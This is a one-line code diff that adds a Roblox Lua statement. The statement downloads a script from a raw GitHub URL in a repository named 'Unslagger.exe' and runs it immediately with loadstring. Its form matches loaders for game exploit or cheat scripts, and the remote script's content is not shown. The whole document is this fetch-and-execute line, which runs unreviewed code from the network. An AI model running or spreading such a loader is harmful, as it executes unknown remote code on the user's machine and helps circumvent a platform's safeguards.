@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/enrabiaaa/Unslagger.exe/main/Script.lua"))()
